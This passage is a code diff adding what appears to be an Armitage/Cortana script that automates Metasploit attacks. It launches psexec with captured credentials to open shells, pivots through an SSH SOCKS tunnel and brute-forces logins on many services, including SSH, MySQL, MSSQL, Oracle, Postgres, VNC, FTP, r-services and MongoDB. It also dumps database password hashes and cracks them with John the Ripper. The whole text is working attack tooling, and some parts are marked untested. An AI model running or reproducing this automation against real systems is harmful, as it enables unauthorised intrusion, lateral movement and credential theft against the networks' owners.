+							wait_for_tunnel($ssh_tunnel_port);
+							%scan_options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+							%handler_options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+						}
+						
+						$port_1 = random_port();
+						
+						%scan_options['PAYLOAD'] = $winpayload_pivot;
+						%scan_options['LPORT'] = $port_1;
+						# now run psexec with the user pass and domain to get shell
+						launch("exploit", "windows/smb/psexec", %scan_options);
+						
+						# Now run with the domain set to "." for local login
+						$SMBDomain = ".";
+						$port_2 = random_port();
+						
+						%scan_options['SMBDomain'] = $SMBDomain;
+						%scan_options['LPORT'] = $port_2;
+						# now run psexec with the user pass and domain to get shell
+						launch("exploit", "windows/smb/psexec", %scan_options);
+						
+						# now connect to the bind shells
+						sleep(2 * 1000);
+						
+						%handler_options['RHOST'] = $psexectarget;
+						%handler_options['PAYLOAD'] = $winpayload_pivot;
+						%handler_options['ExitOnSession'] = 'false';
+						%handler_options['ListenerTimeout'] = $ListenerTimeout;
+						%handler_options['WfsDelay'] = $WfsDelay;
+						
+						%handler_options['LPORT'] = $port_1;
+						launch("exploit", "multi/handler", %handler_options);
+						
+						%handler_options['LPORT'] = $port_2;
+						launch("exploit", "multi/handler", %handler_options);						
+					}
+					else {
+						%scan_options['PAYLOAD'] = $winpayload;
+						%scan_options['LPORT'] = $winport;
+						# now run psexec with the user pass and domain to get shell
+						launch("exploit", "windows/smb/psexec", %scan_options);
+						
+						# Now run with the domain set to "." for local login
+						$SMBDomain = ".";
+						%scan_options['SMBDomain'] = $SMBDomain;
+						
+						# now run psexec with the user pass and domain to get shell
+						launch("exploit", "windows/smb/psexec", %scan_options);
+					}
+				}
+			}
+		}
+	}
+	clear(%targets);
+	clear(@pstargets);
+}
+###############################################################################
+# SSH
+###############################################################################
+command attack_ssh {
+	println("Attacking ssh");
+	attack_ssh();
+}
+
+sub attack_ssh {
+	attack_service("ssh", "scanner/ssh/ssh_login");
+}
+###############################################################################
+# MySQL
+###############################################################################
+command attack_mysql {
+	println("Attacking mysql");
+	attack_mysql();
+}
+
+sub attack_mysql {
+	attack_service("mysql", "scanner/mysql/mysql_login");
+}
+
+command attack_mysql_hashdump {
+	println("Dumping mysql hashes");
+	attack_mysql_hashdump();
+}
+
+sub attack_mysql_hashdump {
+	hashdump("mysql", "mysql.hashes", "scanner/mysql/mysql_hashdump");
+}
+
+command attack_mysql_hashcrack {
+	attack_mysql_hashcrack();
+}
+
+sub attack_mysql_hashcrack {
+	global('$hasRunJTRMysql');
+	if( $hasRunJTRMysql ne "1" ){
+		launch("auxiliary", "analyze/jtr_mysql_fast", %(
+			JOHN_BASE => $JOHN_BASE,
+			JOHN_PATH => $JOHN_PATH,
+			Munge => $JOHN_MUNGE,
+			Wordlist => $JOHN_WORDLIST));
+	
+	$hasRunJTRMysql = "1";
+	}
+}
+###############################################################################
+# MSSQL
+###############################################################################
+command attack_mssql {
+	println("Attacking mssql");
+	attack_mssql();
+	attack_mssql_hashdump();
+}
+
+sub attack_mssql {
+#	attack_service("mssql", "scanner/mssql/mssql_login");
+	attack_service("1433", "scanner/mssql/mssql_login");
+}
+
+command attack_mssql_hashdump {
+	println("Dumping mssql hashes");
+	attack_mssql_hashdump();
+}
+
+sub attack_mssql_hashdump {
+	hashdump("mssql", "mssql.hashes", "scanner/mssql/mssql_hashdump");
+}
+
+command attack_mssql_hashcrack {
+	println("Cracking mssql hashes");
+	attack_mssql_hashcrack();
+}
+
+sub attack_mssql_hashcrack {
+	launch("auxiliary", "analyze/jtr_mssql_fast", %(
+		JOHN_BASE => $JOHN_BASE,
+		JOHN_PATH => $JOHN_PATH,
+		Munge => $JOHN_MUNGE,
+		Wordlist => $JOHN_WORDLIST));
+}
+###############################################################################
+# Oracle
+###############################################################################
+command attack_oracle {
+	println("Attacking oracle");
+	attack_oracle();
+	attack_oracle_hashdump();
+}
+
+sub attack_oracle {
+	attack_service("oracle", "scanner/oracle/oracle_login");
+}
+
+command attack_oracle_hashdump {
+	println("Dumping oracle hashes");
+	attack_oracle_hashdump();
+}
+
+sub attack_oracle_hashdump {
+	hashdump("oracle", "oracle.hashes", "scanner/oracle/oracle_hashdump");
+}
+
+command attack_oracle_hashcrack {
+	println("Cracking oracle hashes");
+	attack_oracle_hashcrack();
+}
+
+sub attack_oracle_hashcrack {
+	launch("auxiliary", "analyze/jtr_oracle_fast", %(
+		JOHN_BASE => $JOHN_BASE,
+		JOHN_PATH => $JOHN_PATH,
+		Munge => $JOHN_MUNGE,
+		Wordlist => $JOHN_WORDLIST));
+}
+###############################################################################
+# Postgres - done
+###############################################################################
+command attack_postgres {
+	println("Attacking postgres");
+	attack_postgres();
+	attack_postgres_hashdump();
+}
+
+sub attack_postgres {
+	attack_service("postgres", "scanner/postgres/postgres_login");
+}
+
+command attack_postgres_hashdump {
+	println("Dumping postgres hashes");
+	attack_postgres_hashdump();
+}
+
+sub attack_postgres_hashdump {
+	hashdump("postgres", "postgres.hashes", "scanner/postgres/postgres_hashdump");
+}
+
+command attack_postgres_hashcrack {
+	println("Cracking postgres hashes");
+	attack_postgres_hashcrack();
+}
+
+sub attack_postgres_hashcrack {
+	launch("auxiliary", "analyze/postgres_md5_crack", %(
+		Munge => $JOHN_MUNGE,
+		Wordlist => $JOHN_WORDLIST));
+}
+###############################################################################
+# Telnet - done
+###############################################################################
+command attack_telnet {
+	println("Attacking telnet");
+	attack_telnet();
+}
+
+sub attack_telnet {
+	attack_service("telnet", "scanner/telnet/telnet_login");
+}
+###############################################################################
+# VNC
+###############################################################################
+command attack_vnc {
+	println("Attacking vnc");
+	attack_vnc();
+}
+
+sub attack_vnc {
+	attack_service("vnc", "scanner/vnc/vnc_login");
+}
+###############################################################################
+# VMWare Authd
+###############################################################################
+command attack_vmauthd {
+	println("Attacking vmauthd");
+	attack_vmauthd();
+}
+
+sub attack_vmauthd {
+	attack_service("vmware-auth", "scanner/vmware/vmauthd_login");
+}
+###############################################################################
+# FTP
+# This module will just fill creds db with what it finds
+###############################################################################
+command attack_ftp {
+	println("Attacking ftp");
+	attack_ftp();
+}
+
+sub attack_ftp {
+	attack_service("ftp", "scanner/ftp/ftp_login");
+}
+###############################################################################
+# rexec
+#
+#
+# NOT TESTED
+#
+###############################################################################
+command attack_rexec {
+	println("Attacking rexec");
+	attack_rexec();
+}
+
+sub attack_rexec {
+	attack_service("exec", "scanner/rservices/rexec_login");
+}
+###############################################################################
+# rlogin
+#
+# TESTING....
+#
+###############################################################################
+command attack_rlogin {
+	println("Attacking rlogin");
+	attack_rlogin();
+}
+
+sub attack_rlogin {
+	attack_service("login", "scanner/rservices/rlogin_login");
+}
+###############################################################################
+# rsh
+###############################################################################
+command attack_rsh {
+	println("Attacking rsh");
+	attack_rsh();
+}
+
+sub attack_rsh {
+	attack_service("shell", "scanner/rservices/rsh_login");
+}
+###############################################################################
+# snmp
+###############################################################################
+command attack_snmp {
+	println("Attacking snmp");
+	attack_snmp();
+}
+
+sub attack_snmp {
+	attack_service("snmp", "scanner/snmp/snmp_login");
+}
+###############################################################################
+# afp
+###############################################################################
+command attack_afp {
+	println("Attacking afp");
+	attack_afp();
+}
+
+sub attack_afp {
+	attack_service("afp", "scanner/afp/afp_login");
+}
+###############################################################################
+# mongodb
+###############################################################################
+command attack_mongodb {
+	println("Attacking mongodb");
+	attack_mongodb();
+}
+
+sub attack_mongodb {
+	attack_service("mongodb", "scanner/mongodb/mongodb_login");
+}
+###############################################################################
+# pcanywhere
+###############################################################################
+command attack_pcanywhere {
+	println("Attacking pcanywhere");
+	attack_pcanywhere();
+}
+
+sub attack_pcanywhere {
+	attack_service("pcanywhere", "scanner/pcanywhere/pcanywhere_login");
+}
+
+#####################################
+# The following _login modules need to be added
+#
+# [module name] [port number]
+#http/glassfish_login 4848
+#misc/cctv_dvr_login 5592
+#nessus/nessus_ntp_login 1241
+#nessus/nessus_xmlrpc_login 8834
+#nexpose/nexpose_api_login 3780
+#openvas/openvas_omp_login 9390
+#openvas/openvas_otp_login 9391
+#oracle/isqlplus_login 5560
+#pop3/pop3_login 110
+#sap/sap_mgmt_con_attack_login 50013
+#winrm/winrm_login 80,443,5985,5986, and named winrm
+
